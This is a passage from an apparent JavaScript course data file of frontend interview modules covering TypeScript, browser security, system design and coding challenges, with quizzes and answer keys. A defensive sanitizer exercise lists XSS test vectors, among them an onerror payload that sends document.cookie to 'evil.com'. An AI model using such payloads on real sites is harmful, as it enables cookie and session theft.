      { q: 'What causes Cumulative Layout Shift (CLS)?', options: ['Slow JavaScript execution', 'Images or ads loading without reserved space, pushing content down', 'Large CSS files', 'Synchronous fetch calls'], correct: 1, explanation: 'CLS measures unexpected layout shifts. Main causes: images without width/height attributes, ads/embeds loading dynamically, dynamic content insertion above existing content. Fix: always set dimensions.' },
      { q: 'What is the difference between async and defer on a script tag?', options: ['async is for modules, defer is for classic scripts', 'async executes immediately when downloaded (unordered), defer executes after HTML parsing (ordered)', 'Both are the same', 'defer fetches in parallel, async doesn\'t'], correct: 1, explanation: 'Both fetch scripts in parallel without blocking HTML parsing. async executes the script immediately when downloaded (order not guaranteed). defer executes after HTML is fully parsed, in order — safer for app scripts.' },
      { q: 'What does React.lazy() do?', options: ['Makes a component render lazily after 100ms', 'Enables code splitting by loading a component only when it is rendered', 'Prevents a component from re-rendering', 'Defers useEffect execution'], correct: 1, explanation: 'React.lazy(() => import(\'./Component\')) creates a lazy component loaded on-demand via dynamic import. Combined with Suspense, it splits the component into a separate bundle loaded only when needed.' },
      { q: 'Which approach produces a smaller bundle for lodash utilities?', options: ['import _ from "lodash"', 'import { debounce } from "lodash"', 'import debounce from "lodash/debounce"', 'require("lodash/debounce")'], correct: 2, explanation: 'lodash is a CommonJS library — named imports from the root ({debounce}) don\'t tree-shake. lodash/debounce directly imports only that module. For ESM tree-shaking, use lodash-es with named imports.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement an LRU (Least Recently Used) Cache — a common interview question that tests data structures and real caching knowledge. The cache has a max size. When full, eviction removes the least recently used item. Implement get(key) and put(key, value). O(1) for both operations.',
      starterCode: `class LRUCache {
  constructor(capacity) {
    this.capacity = capacity
    // Use Map — it preserves insertion order
    this.cache = new Map()
  }

  get(key) {
    if (!this.cache.has(key)) return -1
    // Move to end (most recently used)
    const value = this.cache.get(key)
    this.cache.delete(key)
    this.cache.set(key, value)
    return value
  }

  put(key, value) {
    if (this.cache.has(key)) this.cache.delete(key)
    if (this.cache.size >= this.capacity) {
      // TODO: delete the LEAST recently used (first key in Map)
    }
    this.cache.set(key, value)
  }
}

const cache = new LRUCache(3)
cache.put('a', 1)
cache.put('b', 2)
cache.put('c', 3)
console.log(cache.get('a'))  // 1 (a is now most recent)
cache.put('d', 4)            // evicts 'b' (least recently used)
console.log(cache.get('b'))  // -1 (evicted)
console.log(cache.get('c'))  // 3
console.log(cache.get('d'))  // 4`,
      hints: ['Map.keys().next().value gives the first (oldest) key', 'After get(), delete and re-set the key to move it to end of Map', 'Use this.cache.size >= this.capacity to check if eviction needed'],
    },
  },
  {
    id: 'cc-interview-fe-m05', track: 'crash', title: 'TypeScript for Frontend Interviews',
    subtitle: 'Generics, utility types, type narrowing, discriminated unions, and the TypeScript patterns used in production.',
    moduleObjective: 'Write generic TypeScript functions, use built-in utility types correctly, narrow types with guards, and explain strict mode behavior to an interviewer.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'Masters', xp: 210, duration: 14, module: 5, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'Generic', definition: 'A type parameter that lets a function/type work with any type while preserving type information. function identity<T>(x: T): T — T is inferred at call site.' },
      { term: 'Utility Types', definition: 'Built-in mapped types: Partial<T> (all optional), Required<T>, Readonly<T>, Pick<T,K>, Omit<T,K>, Record<K,V>, Exclude<T,U>, Extract<T,U>.' },
      { term: 'Type Narrowing', definition: 'Refining a union type to a specific member using typeof, instanceof, in operator, or custom type guards (is keyword).' },
      { term: 'Discriminated Union', definition: 'A union where each member has a shared literal field (discriminant). switch(action.type) narrows to the correct member.' },
      { term: 'Type Guard', definition: 'A function whose return type is "x is T" — tells TypeScript that when it returns true, x is narrowed to type T within that branch.' },
      { term: 'Mapped Type', definition: 'Transforms every property of a type: { [K in keyof T]: ... }. Utility types are built this way.' },
      { term: 'Conditional Type', definition: 'T extends U ? X : Y — works like a ternary for types. Used in utility types like NonNullable<T> = T extends null | undefined ? never : T.' },
    ],
    content: `## TypeScript for Frontend Interviews

### Generics — The Most Interview-Tested Feature

\`\`\`ts
// Without generics: loses type information
function first(arr: any[]): any { return arr[0] }
const x = first([1, 2, 3])  // x is 'any' — TypeScript can't help you

// With generics: type is preserved
function first<T>(arr: T[]): T | undefined { return arr[0] }
const x = first([1, 2, 3])    // x is number
const y = first(['a', 'b'])   // y is string
const z = first<boolean>([])  // z is boolean | undefined

// Generic with constraint
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key]
}
const name = getProperty({ name: 'Jordan', age: 30 }, 'name')  // string
// getProperty(user, 'invalid')  // TS Error: 'invalid' not in keyof T
\`\`\`

---

### Utility Types — Know These Cold

\`\`\`ts
interface User {
  id: number
  name: string
  email: string
  role: 'admin' | 'user'
}

// Partial — all fields optional (for update payloads)
type UserUpdate = Partial<User>  // { id?: number; name?: string; ... }

// Required — all fields required (opposite of Partial)
type RequiredUser = Required<UserUpdate>

// Readonly — immutable version
type ImmutableUser = Readonly<User>

// Pick — select specific fields
type UserPreview = Pick<User, 'id' | 'name'>  // { id: number; name: string }

// Omit — exclude specific fields
type CreateUser = Omit<User, 'id'>  // { name: string; email: string; role: ... }

// Record — typed dictionary
type RolePermissions = Record<User['role'], string[]>
// { admin: string[]; user: string[] }

// ReturnType — infer return type of a function
function getUser() { return { id: 1, name: 'Jordan' } }
type UserResult = ReturnType<typeof getUser>  // { id: number; name: string }

// Parameters — infer function parameter types
type GetUserArgs = Parameters<typeof getUser>  // []
\`\`\`

---

### Type Narrowing

\`\`\`ts
type StringOrNumber = string | number

function double(x: StringOrNumber) {
  if (typeof x === 'string') {
    return x.repeat(2)    // x is string here
  }
  return x * 2            // x is number here
}

// instanceof narrowing
function format(date: Date | string): string {
  if (date instanceof Date) {
    return date.toISOString()  // Date
  }
  return new Date(date).toISOString()  // string
}

// in narrowing
type Fish = { swim: () => void }
type Bird = { fly: () => void }
function move(animal: Fish | Bird) {
  if ('swim' in animal) {
    animal.swim()  // Fish
  } else {
    animal.fly()   // Bird
  }
}

// Custom type guard
function isString(x: unknown): x is string {
  return typeof x === 'string'
}

function processInput(x: unknown) {
  if (isString(x)) {
    console.log(x.toUpperCase())  // x is string — safe
  }
}
\`\`\`

---

### Discriminated Unions — Redux Pattern

\`\`\`ts
type Action =
  | { type: 'INCREMENT'; amount: number }
  | { type: 'DECREMENT'; amount: number }
  | { type: 'RESET' }
  | { type: 'SET_USER'; user: User }

function reducer(state: AppState, action: Action): AppState {
  switch (action.type) {
    case 'INCREMENT':
      return { ...state, count: state.count + action.amount }  // action.amount is number
    case 'SET_USER':
      return { ...state, user: action.user }  // action.user is User
    case 'RESET':
      return initialState  // no extra fields to access
    default:
      // Never check: ensures all cases handled
      const _exhaustive: never = action
      return state
  }
}
\`\`\`

---

### Mapped Types — Building Utility Types From Scratch

\`\`\`ts
// Implement Partial from scratch
type MyPartial<T> = {
  [K in keyof T]?: T[K]
}

// Implement Readonly
type MyReadonly<T> = {
  readonly [K in keyof T]: T[K]
}

// Implement Required
type MyRequired<T> = {
  [K in keyof T]-?: T[K]  // -? removes optionality
}

// Implement Pick
type MyPick<T, K extends keyof T> = {
  [P in K]: T[P]
}

// Deep Partial (recursive)
type DeepPartial<T> = {
  [K in keyof T]?: T[K] extends object ? DeepPartial<T[K]> : T[K]
}
\`\`\`

---

### Template Literal Types

\`\`\`ts
type EventName = 'click' | 'focus' | 'blur'
type Handler = \`on\${Capitalize<EventName>}\`
// 'onClick' | 'onFocus' | 'onBlur'

type CSSProperty = 'color' | 'background' | 'margin'
type CSSValue = string | number
type CSSDeclaration = { [K in CSSProperty]?: CSSValue }

// API route typing
type ApiRoute = '/users' | '/posts' | '/comments'
type ApiMethod = 'GET' | 'POST' | 'DELETE'
type ApiEndpoint = \`\${ApiMethod} \${ApiRoute}\`
// 'GET /users' | 'GET /posts' | ... | 'DELETE /comments'
\`\`\`
`,
    quiz: [
      { q: 'What does `Omit<User, "id" | "password">` produce?', options: ['A type with only id and password', 'A type with all User fields except id and password', 'A partial User type', 'A union of id and password types'], correct: 1, explanation: 'Omit<T, K> creates a new type with all properties of T except those listed in K. Common for creating DTO types — e.g. a create payload that doesn\'t include server-generated fields like id.' },
      { q: 'What is a discriminated union?', options: ['A union where all members are different types', 'A union where each member has a shared literal property used to narrow the type', 'A union that excludes null and undefined', 'A mapped type with conditions'], correct: 1, explanation: 'A discriminated union has a shared "discriminant" field with a unique literal value per member (type: "INCREMENT" | "DECREMENT" | "RESET"). switch/if on the discriminant narrows TypeScript to the specific member.' },
      { q: 'When is a type guard (x is T) needed instead of typeof?', options: ['Always — type guards are more powerful', 'When narrowing custom object types that typeof can\'t distinguish', 'Only inside React components', 'When the type is a primitive'], correct: 1, explanation: 'typeof only distinguishes primitives (string, number, boolean, etc.) and returns "object" for all objects. For custom object types like Fish vs Bird, use instanceof, in operator, or a custom is-guard.' },
      { q: 'What does the -? modifier do in a mapped type?', options: ['Makes a property optional', 'Makes a property required by removing optionality', 'Makes a property readonly', 'Excludes a property'], correct: 1, explanation: '-? removes the optional modifier from a property. Used to implement Required<T>: { [K in keyof T]-?: T[K] } makes every property required, even if the original had ?.' },
    ],
    ide: {
      language: 'typescript',
      task: 'Implement three utility types from scratch: (1) DeepReadonly<T> — makes all nested properties readonly, (2) FlattenPromise<T> — if T is Promise<X>, return X, otherwise return T, (3) NonNullableFields<T> — removes null and undefined from all values in T. Test each with a sample type.',
      starterCode: `// 1. DeepReadonly<T> — recursively makes all properties readonly
type DeepReadonly<T> = {
  // TODO: make each property readonly, and if it's an object, recurse
}

// 2. FlattenPromise<T> — unwrap Promise type
type FlattenPromise<T> = // TODO: T extends Promise<infer X> ? X : T

// 3. NonNullableFields<T> — remove null/undefined from all field types
type NonNullableFields<T> = {
  // TODO: map over keys, apply NonNullable<T[K]> to each value
}

// Test types
interface Config {
  host: string
  port: number
  db: {
    name: string
    credentials: {
      user: string
      pass: string
    }
  }
}

type ReadonlyConfig = DeepReadonly<Config>
// ReadonlyConfig.db.credentials.user should be readonly

type UserData = {
  name: string | null
  email: string | undefined
  age: number | null
}
type CleanUser = NonNullableFields<UserData>
// CleanUser.name should be string, not string | null`,
      hints: ['DeepReadonly: use T[K] extends object ? DeepReadonly<T[K]> : T[K]', 'FlattenPromise: use infer — T extends Promise<infer U> ? U : T', 'NonNullableFields: { [K in keyof T]: NonNullable<T[K]> }'],
    },
  },
  {
    id: 'cc-interview-fe-m06', track: 'crash', title: 'Browser APIs, Security & Network',
    subtitle: 'CORS, CSP, XSS prevention, localStorage vs cookies, fetch internals, and the questions senior engineers ask.',
    moduleObjective: 'Explain CORS preflight, implement XSS-safe rendering, describe cookie security flags, and handle authentication tokens correctly in a browser app.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 240, duration: 16, module: 6, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'CORS', definition: 'Cross-Origin Resource Sharing. Browser policy that blocks JS from reading responses from different origins unless the server includes the right Access-Control-Allow-Origin headers.' },
      { term: 'CSRF', definition: 'Cross-Site Request Forgery. Attacker tricks authenticated user into making an unintended request. Prevented by SameSite cookie flag and CSRF tokens.' },
      { term: 'XSS (Cross-Site Scripting)', definition: 'Attacker injects executable scripts into your page. Stored XSS: saved in DB. Reflected: in URL. DOM-based: client-side JS. Prevented by HTML escaping and CSP.' },
      { term: 'CSP', definition: 'Content Security Policy. HTTP header that tells the browser which sources are trusted for scripts, styles, images. Mitigates XSS by blocking inline scripts and unauthorized sources.' },
      { term: 'Same-Origin Policy', definition: 'Browsers allow JS to read responses only from the same origin (protocol + domain + port). CORS is the mechanism to relax this restriction safely.' },
      { term: 'HttpOnly Cookie', definition: 'Cookie flag that prevents JavaScript access (document.cookie). Auth tokens stored as HttpOnly cookies cannot be stolen by XSS attacks.' },
      { term: 'SameSite Cookie', definition: 'Cookie flag: Strict (never cross-site), Lax (safe GET requests only), None (cross-site with Secure required). Lax is the modern default — prevents CSRF.' },
    ],
    content: `## Browser APIs, Security & Network

### CORS — Why Your Fetch Call Fails

The browser's Same-Origin Policy blocks JS from reading cross-origin responses. CORS lets servers whitelist origins.

\`\`\`
Origin: https://myapp.com
Request to: https://api.external.com/data

Browser blocks by default unless response includes:
Access-Control-Allow-Origin: https://myapp.com
\`\`\`

**Preflight request** — for non-simple requests (PUT, DELETE, custom headers):
Browser sends an OPTIONS request first. The server must respond with CORS headers. Only then does the actual request go out.

\`\`\`js
// This triggers a preflight because of the Content-Type header
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },  // triggers preflight
  body: JSON.stringify({ data: 'value' }),
})

// Server must return:
// Access-Control-Allow-Origin: https://myapp.com
// Access-Control-Allow-Methods: GET, POST
// Access-Control-Allow-Headers: Content-Type
\`\`\`

**Interview answer:** "CORS is a browser security feature that restricts cross-origin reads. The server controls it via response headers. A preflight OPTIONS request checks permissions before the actual request."

---

### XSS — The Most Common Web Vulnerability

\`\`\`html
<!-- DANGEROUS: never inject user content into innerHTML -->
div.innerHTML = userInput  // if userInput = "<script>stealCookies()</script>"

<!-- SAFE: textContent escapes HTML -->
div.textContent = userInput  // renders as literal text, not HTML

<!-- SAFE: createElement avoids string parsing -->
const p = document.createElement('p')
p.textContent = userInput
container.appendChild(p)
\`\`\`

**React is XSS-safe by default** — JSX escapes all values:
\`\`\`jsx
const name = '<script>alert("xss")</script>'
<div>{name}</div>  // Renders as text, not executed

// The one escape hatch — ONLY use with sanitized HTML
<div dangerouslySetInnerHTML={{ __html: sanitized }} />
// Use DOMPurify.sanitize() before passing to dangerouslySetInnerHTML
\`\`\`

---

### Cookie Security Flags

\`\`\`
Set-Cookie: token=abc123;
  HttpOnly;           /* JS cannot read via document.cookie — XSS safe */
  Secure;             /* Only sent over HTTPS */
  SameSite=Lax;       /* Not sent on cross-site requests — CSRF protection */
  Path=/;
  Max-Age=86400;      /* 1 day */
\`\`\`

**localStorage vs HttpOnly Cookie for auth tokens:**

| | localStorage | HttpOnly Cookie |
|---|---|---|
| XSS risk | HIGH — JS can read | None — JS blocked |
| CSRF risk | None — not auto-sent | LOW with SameSite=Lax |
| Accessible to JS | Yes | No |
| SSR support | No | Yes |

**Best practice:** Store auth tokens in HttpOnly cookies. If you must use localStorage (e.g., SPA with external API), use short-lived tokens and refresh tokens.

---

### Fetch — Internals and Error Handling

\`\`\`js
// fetch only rejects on NETWORK errors, not HTTP errors (4xx, 5xx)
async function apiCall(url, options = {}) {
  const controller = new AbortController()
  const timeout = setTimeout(() => controller.abort(), 10000)  // 10s timeout

  try {
    const res = await fetch(url, {
      ...options,
      signal: controller.signal,
      credentials: 'include',  // include cookies for cross-origin requests
    })

    clearTimeout(timeout)

    if (!res.ok) {
      const error = await res.json().catch(() => ({ message: res.statusText }))
      throw new Error(error.message || \`HTTP \${res.status}\`)
    }

    return await res.json()
  } catch (err) {
    if (err.name === 'AbortError') throw new Error('Request timed out')
    throw err
  }
}
\`\`\`

---

### Content Security Policy

\`\`\`
Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://cdn.trusted.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.myapp.com;
  frame-ancestors 'none';
\`\`\`

**In Next.js:**
\`\`\`js
// next.config.js
const headers = [
  {
    key: 'Content-Security-Policy',
    value: "default-src 'self'; script-src 'self' 'nonce-{nonce}'"
  }
]
\`\`\`

---

### Web Storage — localStorage, sessionStorage, IndexedDB

\`\`\`js
// localStorage — persists until cleared, 5-10MB limit
localStorage.setItem('theme', 'dark')
localStorage.getItem('theme')  // 'dark'

// sessionStorage — cleared when tab closes
sessionStorage.setItem('draftForm', JSON.stringify(formData))

// IndexedDB — async, transactional, unlimited size
// Use idb library (wrapper around raw IndexedDB API)
import { openDB } from 'idb'
const db = await openDB('myapp', 1, {
  upgrade(db) {
    db.createObjectStore('products', { keyPath: 'id' })
  }
})
await db.put('products', { id: 1, name: 'Widget', price: 9.99 })
const product = await db.get('products', 1)
\`\`\`
`,
    quiz: [
      { q: 'Why does the browser send a preflight OPTIONS request before some fetch calls?', options: ['To check server health', 'To verify the server supports CORS for non-simple requests before sending sensitive data', 'All fetch calls send a preflight', 'To cache CORS settings'], correct: 1, explanation: 'Simple requests (GET/POST with standard content types) don\'t trigger preflight. Non-simple requests (PUT/DELETE, custom headers, application/json) trigger an OPTIONS preflight to ask "do you allow this cross-origin request?"' },
      { q: 'Why should auth tokens be stored in HttpOnly cookies rather than localStorage?', options: ['Cookies are faster', 'HttpOnly cookies are inaccessible to JavaScript — XSS attacks cannot steal them', 'localStorage has a size limit', 'CORS doesn\'t apply to cookies'], correct: 1, explanation: 'document.cookie can\'t read HttpOnly cookies — they\'re transmitted automatically by the browser but invisible to JavaScript. localStorage is fully readable by any JS running on the page, including injected XSS scripts.' },
      { q: 'What does fetch() do when the server returns a 404 or 500 status?', options: ['It rejects the Promise with an error', 'It resolves the Promise — you must check res.ok manually', 'It retries automatically', 'It throws a TypeError'], correct: 1, explanation: 'fetch() only rejects for network failures (DNS error, connection refused, timeout). HTTP error status codes (4xx, 5xx) result in a resolved Promise with res.ok === false. Always check res.ok.' },
      { q: 'How does React prevent XSS by default?', options: ['By using DOMPurify on all inputs', 'By running in a sandboxed iframe', 'By escaping all JSX expression values as text, not HTML', 'By blocking all event handlers'], correct: 2, explanation: 'React\'s JSX expressions ({value}) escape HTML entities before inserting into the DOM. <script> becomes &lt;script&gt; — rendered as text, not parsed as HTML. dangerouslySetInnerHTML is the explicit escape hatch.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Build a safe HTML sanitizer function. It should take a string that might contain HTML and return a version with all script tags, event handlers (onclick, onload, etc.), and javascript: hrefs removed. Test it against 5 XSS attack vectors.',
      starterCode: `function sanitizeHTML(dirty) {
  // Approach 1: use DOMParser to parse, then walk and clean
  // (In production, use DOMPurify — this is for understanding)
  const parser = new DOMParser()
  const doc = parser.parseFromString(dirty, 'text/html')

  function cleanNode(node) {
    // TODO: if node is a <script>, remove it
    // TODO: if node is an element, remove all event handler attributes
    // TODO: if node is an <a> with href starting with "javascript:", remove href
    // Recurse into children
    const children = [...node.childNodes]
    children.forEach(cleanNode)
  }

  cleanNode(doc.body)
  return doc.body.innerHTML
}

// Test cases
const tests = [
  '<p>Hello <b>world</b></p>',                              // Safe — keep as-is
  '<script>alert("xss")</script><p>content</p>',            // Remove script
  '<p onclick="stealData()">click me</p>',                  // Remove onclick
  '<a href="javascript:alert(1)">link</a>',                 // Remove href
  '<img src="x" onerror="fetch(\'//evil.com/\'+document.cookie)">',  // Remove onerror
]

tests.forEach((t, i) => console.log(\`Test \${i+1}:\`, sanitizeHTML(t)))`,
      hints: ['node.nodeName === "SCRIPT" to detect script tags', 'node.attributes to iterate attributes, check name.startsWith("on")', 'Use node.parentNode.removeChild(node) to remove nodes'],
    },
  },
  {
    id: 'cc-interview-fe-m07', track: 'crash', title: 'Frontend System Design',
    subtitle: 'Design a design system, an infinite feed, a real-time dashboard, or an autocomplete — the senior interview questions.',
    moduleObjective: 'Articulate architectural decisions for complex frontend systems: component APIs, state management at scale, offline support, and accessibility at the system level.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 250, duration: 18, module: 7, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'Component API Design', definition: 'Designing prop interfaces: composition over configuration, render props, compound components, controlled vs uncontrolled. How the component is consumed matters more than implementation.' },
      { term: 'Micro-Frontend', definition: 'Breaking a large frontend app into independently deployable pieces. Each team owns a route/feature. Module Federation (Webpack 5) is the main implementation.' },
      { term: 'Optimistic Updates', definition: 'Updating the UI immediately before the server confirms, then rolling back on error. Improves perceived performance. Used in likes, comments, todos.' },
      { term: 'Virtual Scrolling', definition: 'Only render DOM elements visible in the viewport, not the entire list. Crucial for lists of 10,000+ items. Libraries: @tanstack/virtual, react-window.' },
      { term: 'Offline-First', definition: 'App works without network by default using Service Workers and IndexedDB. Syncs when back online. PWA architecture pattern.' },
      { term: 'Design Token', definition: 'Named variables for design decisions: colors, spacing, typography, shadows. Defined once, used everywhere. Bridge between design tools (Figma) and code.' },
      { term: 'Storybook', definition: 'Component development environment. Documents components in isolation with all states. Used as the source of truth for design systems.' },
    ],
    content: `## Frontend System Design

### How to Approach a Frontend System Design Question

When asked "design X", interviewers look for:
1. **Clarifying questions first** — users, scale, constraints, real-time needs?
2. **High-level architecture** — monolith vs micro-frontend, state management strategy
3. **Component API** — how are components consumed? What props/composition model?
4. **Data layer** — fetch strategy, caching, offline?
5. **Performance** — code splitting, virtual scrolling, image optimization
6. **Accessibility** — keyboard navigation, ARIA, screen reader support

---

### Design: Infinite Scroll Feed (Twitter/Instagram)

**Clarifying questions:**
- 10k users or 10M? Desktop or mobile-first?
- Real-time updates or polling?
- Content types: text only or media?

**Architecture:**
\`\`\`
┌─────────────────────────────────────────┐
│ FeedPage                                │
│  ├── FeedFilter (category/sort)         │
│  ├── VirtualList (react-window)         │
│  │    ├── FeedPost (for each item)      │
│  │    │    ├── PostHeader               │
│  │    │    ├── PostContent (lazy media) │
│  │    │    └── PostActions              │
│  └── InfiniteLoader (intersection obs) │
└─────────────────────────────────────────┘
\`\`\`

**Data layer:**
\`\`\`js
// React Query for server state
function useFeed(filters) {
  return useInfiniteQuery({
    queryKey: ['feed', filters],
    queryFn: ({ pageParam = null }) =>
      fetchFeed({ cursor: pageParam, ...filters }),
    getNextPageParam: (lastPage) => lastPage.nextCursor,
    staleTime: 30_000,   // 30s — don't refetch if recent
    gcTime: 5 * 60_000,  // 5min — keep in memory
  })
}
\`\`\`

**Virtual scrolling for 1000s of posts:**
\`\`\`jsx
import { useVirtualizer } from '@tanstack/react-virtual'

function VirtualFeed({ posts }) {
  const parentRef = useRef()
  const virtualizer = useVirtualizer({
    count: posts.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 150,  // estimated post height
  })

  return (
    <div ref={parentRef} style={{ height: '100vh', overflow: 'auto' }}>
      <div style={{ height: virtualizer.getTotalSize() }}>
        {virtualizer.getVirtualItems().map(item => (
          <div key={item.key} style={{ transform: \`translateY(\${item.start}px)\` }}>
            <FeedPost post={posts[item.index]} />
          </div>
        ))}
      </div>
    </div>
  )
}
\`\`\`

---

### Design: Autocomplete Input

\`\`\`
User types → debounce 200ms → fetch suggestions → render dropdown
                                                 → keyboard navigation
                                                 → selection → close
\`\`\`

**Key decisions:**
- Controlled vs uncontrolled: controlled (parent owns value)
- Accessibility: combobox role, aria-expanded, aria-activedescendant
- Performance: debounce, abort previous fetch, cache results

\`\`\`jsx
function Autocomplete({ onSelect, fetchSuggestions }) {
  const [query, setQuery] = useState('')
  const [suggestions, setSuggestions] = useState([])
  const [activeIndex, setActiveIndex] = useState(-1)
  const [isOpen, setIsOpen] = useState(false)

  const debouncedFetch = useMemo(
    () => debounce(async (q) => {
      if (!q) { setSuggestions([]); return }
      const results = await fetchSuggestions(q)
      setSuggestions(results)
      setIsOpen(true)
    }, 200),
    [fetchSuggestions]
  )

  const handleKeyDown = (e) => {
    if (e.key === 'ArrowDown') setActiveIndex(i => Math.min(i + 1, suggestions.length - 1))
    if (e.key === 'ArrowUp')   setActiveIndex(i => Math.max(i - 1, 0))
    if (e.key === 'Enter' && activeIndex >= 0) handleSelect(suggestions[activeIndex])
    if (e.key === 'Escape') setIsOpen(false)
  }

  return (
    <div role="combobox" aria-expanded={isOpen} aria-haspopup="listbox">
      <input
        value={query}
        onChange={e => { setQuery(e.target.value); debouncedFetch(e.target.value) }}
        onKeyDown={handleKeyDown}
        aria-autocomplete="list"
        aria-activedescendant={activeIndex >= 0 ? \`option-\${activeIndex}\` : undefined}
      />
      {isOpen && (
        <ul role="listbox">
          {suggestions.map((s, i) => (
            <li key={s.id} id={\`option-\${i}\`} role="option"
                aria-selected={i === activeIndex}
                onMouseDown={() => handleSelect(s)}>
              {s.label}
            </li>
          ))}
        </ul>
      )}
    </div>
  )
}
\`\`\`

---

### Design System Architecture

\`\`\`
Design Tokens (CSS variables / JSON)
  └── Primitive Components (Button, Input, Text, Icon)
        └── Composite Components (Form, Card, Modal, Table)
              └── Pattern Components (LoginForm, ProductCard)
                    └── Page Templates
\`\`\`

**Tokens:**
\`\`\`css
:root {
  --color-primary-500: #3b82f6;
  --color-primary-600: #2563eb;
  --spacing-4: 16px;
  --spacing-8: 32px;
  --radius-md: 8px;
  --shadow-card: 0 1px 3px rgba(0,0,0,0.12);
  --font-size-base: 16px;
  --font-size-lg: 20px;
}
\`\`\`
`,
    quiz: [
      { q: 'Why use virtual scrolling for a long list instead of rendering all items?', options: ['Virtual scrolling is faster to write', 'DOM nodes are expensive — rendering 10,000 elements causes slow scroll and memory issues', 'React can\'t render more than 100 items', 'It reduces network requests'], correct: 1, explanation: 'Each DOM node consumes memory and layout computation. 10,000 rendered items makes scroll janky even if items are hidden. Virtual scrolling keeps only ~20 DOM nodes visible, replacing them as the user scrolls.' },
      { q: 'What is an optimistic update?', options: ['A fetch that always succeeds', 'Updating the UI immediately before server confirmation, rolling back on failure', 'A prediction of what the server will return', 'A prefetch on hover'], correct: 1, explanation: 'Optimistic updates improve perceived performance. When you like a post, increment the count immediately. If the API call fails, roll back. React Query and SWR support this with onMutate/onError callbacks.' },
      { q: 'In an autocomplete component, what is aria-activedescendant for?', options: ['It names the dropdown container', 'It tells screen readers which option is currently highlighted without moving focus from the input', 'It counts the suggestions', 'It marks the selected option'], correct: 1, explanation: 'aria-activedescendant lets you keep focus on the input while indicating which listbox option is "active". Screen readers announce the highlighted item without the user losing keyboard control of the input.' },
      { q: 'What is the purpose of design tokens?', options: ['Temporary passwords for design tools', 'Named variables for design decisions (colors, spacing) that are defined once and used everywhere', 'Authentication for Figma API', 'Component library licenses'], correct: 1, explanation: 'Design tokens are the single source of truth for visual properties. --color-primary-500: #3b82f6 means changing one value updates every component. Bridges Figma and code. Tools: Style Dictionary, Token Studio.' },
    ],
    ide: {
      language: 'javascript',
      task: 'Implement a debounced search function with abort controller — simulating an autocomplete backend call. The function should: debounce inputs by 200ms, abort any in-flight fetch when a new call starts, and return an array of matching results. Simulate with a local array search.',
      starterCode: `// Simulate a slow backend search
async function searchBackend(query, signal) {
  // Simulate network delay
  await new Promise((resolve, reject) => {
    const timer = setTimeout(resolve, 100)
    signal.addEventListener('abort', () => {
      clearTimeout(timer)
      reject(new DOMException('Aborted', 'AbortError'))
    })
  })
  const data = ['apple', 'application', 'apply', 'apt', 'banana', 'band', 'bandana']
  return data.filter(s => s.startsWith(query))
}

function createDebouncedSearch(delay = 200) {
  let timer = null
  let controller = null

  return async function search(query) {
    // TODO: clear previous timer
    // TODO: abort previous in-flight request
    // TODO: return a Promise that resolves after delay with results
    // TODO: create a new AbortController for this request
    // TODO: inside the setTimeout, call searchBackend with signal
    // TODO: handle AbortError gracefully (return [] or rethrow)
  }
}

const search = createDebouncedSearch(200)

// Simulate rapid typing
;(async () => {
  search('ap').then(r => console.log('ap:', r))   // Will be aborted
  search('app').then(r => console.log('app:', r)) // Will be aborted
  search('appl').then(r => console.log('appl:', r)).catch(e => console.log('aborted:', e.message))
  // Only this should complete:
  search('apple').then(r => console.log('apple:', r))
})()`,
      hints: ['clearTimeout(timer) at start of each call', 'controller?.abort() before creating new controller = new AbortController()', 'catch AbortError: if (e.name === "AbortError") return []'],
    },
  },
  {
    id: 'cc-interview-fe-m08', track: 'crash', title: 'Live Coding Interview — Real Challenges',
    subtitle: 'The exact coding challenges used at Google, Meta, and startups. Implement them clean, explain your thinking, and handle edge cases.',
    moduleObjective: 'Solve common frontend coding challenges under time pressure: implement core JS utilities, build UI components without frameworks, and explain complexity tradeoffs.',
    courseObjective: CC_FE_OBJ, crashId: 'cc-interview-frontend', crashTitle: 'Frontend Interview Prep',
    level: 'PhD', xp: 280, duration: 20, module: 8, certArea: 'Frontend Interview Prep',
    keyTerms: [
      { term: 'Flatten', definition: 'Reduce a nested array/object to a single level. Recursive or iterative with a stack. Common interview problem.' },
      { term: 'EventEmitter', definition: 'Pub/sub pattern: on(event, handler), emit(event, ...args), off(event, handler). Implement from scratch — tests OOP and closure knowledge.' },
      { term: 'Promise.all vs Promise.allSettled', definition: 'all: rejects on first failure. allSettled: waits for all, returns status+value/reason for each. Use allSettled when partial success is acceptable.' },
      { term: 'Curry', definition: 'Transform f(a,b,c) into f(a)(b)(c). Each call returns a new function until all args are provided. Tests closure and function composition understanding.' },
      { term: 'Deep Clone', definition: 'Create a structurally identical copy with no shared references. structuredClone() is the modern API. JSON.parse/stringify breaks functions/Date/undefined.' },
      { term: 'Throttle', definition: 'Limit function calls to once per interval. Leading edge: fires immediately then waits. Trailing edge: waits then fires. Used for scroll/resize handlers.' },
      { term: 'Pipe / Compose', definition: 'pipe(f, g, h)(x) = h(g(f(x))). compose goes right to left. Functional programming pattern — chain transformations cleanly.' },
    ],
    content: `## Live Coding Interview — Real Challenges

### How to Handle a Live Coding Interview

1. **Repeat the problem** — confirm you understand it before coding
2. **Ask about edge cases** — empty input? null? large input?
3. **State your approach** before writing — "I'll use a map for O(1) lookup"
4. **Write clean code** — readable variable names, not terse one-liners
5. **Test with examples** — walk through your code with inputs
6. **Mention complexity** — "this is O(n) time, O(n) space"

---

### Challenge 1: Flatten Nested Array

\`\`\`js
// Input: [1, [2, [3, [4]], 5]]
// Output: [1, 2, 3, 4, 5]

// Recursive (clean)
function flatten(arr) {
  return arr.reduce((acc, item) =>
    Array.isArray(item) ? acc.concat(flatten(item)) : acc.concat(item),
    []
  )
}

